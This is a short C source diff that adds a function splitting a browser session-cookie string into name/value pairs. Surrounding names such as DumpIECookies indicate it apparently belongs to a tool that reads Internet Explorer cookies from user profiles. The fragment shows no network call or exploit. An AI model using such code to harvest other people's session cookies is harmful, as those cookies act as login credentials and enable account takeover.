@@ -76,8 +76,34 @@ WCHAR *GetIEProfilePath(WCHAR *cookie_path)
 	return FullPath;
 }
 
+// Divide e parsa i singoli cookie all'interno di uno stringone
 void ParseSessionCookies(WCHAR *cookie_string, WCHAR *domain)
 {
+	WCHAR *ptr1, *ptr2, *ptr3;
+	
+	if (wcslen(cookie_string) == 0)
+		return;
+
+	ptr1 = cookie_string;
+	do {
+		ptr2 = wcschr(ptr1, L';');
+		if (ptr2) 
+			*ptr2 = NULL;
+	
+		ptr3 = wcschr(ptr1, L'=');
+		if (ptr3) {
+			*ptr3 = NULL;
+			ptr3++;
+			AddCookieW(domain, ptr1, ptr3);
+		}
+
+		ptr1 = ptr2;
+		if (ptr1) {
+			ptr1++;
+			if (*ptr1 == L' ')
+				ptr1++;
+		}
+	} while(ptr1);
 }
 
 int DumpIECookies(WCHAR *cookie_path)
